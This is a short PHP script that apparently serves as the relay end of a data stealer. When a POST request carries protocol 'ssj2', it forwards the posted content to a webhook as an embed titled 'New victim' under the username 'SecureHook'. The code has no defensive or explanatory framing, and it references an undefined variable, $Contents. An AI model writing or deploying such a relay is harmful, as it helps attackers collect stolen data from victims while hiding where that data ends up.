<?php
if($_POST["protocol"] == "ssj2")
{
$url = "webhook";
$Content = $_POST["Content"];

$hookObject = json_encode([
    "content" => $Contents,
    "username" => "SecureHook",
 
    "tts" => false,
 
    "embeds" => [
      
        [
           
            "title" => "New victim",

           
            "type" => "rich",

           
            "description" => $Content,
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );
}
?>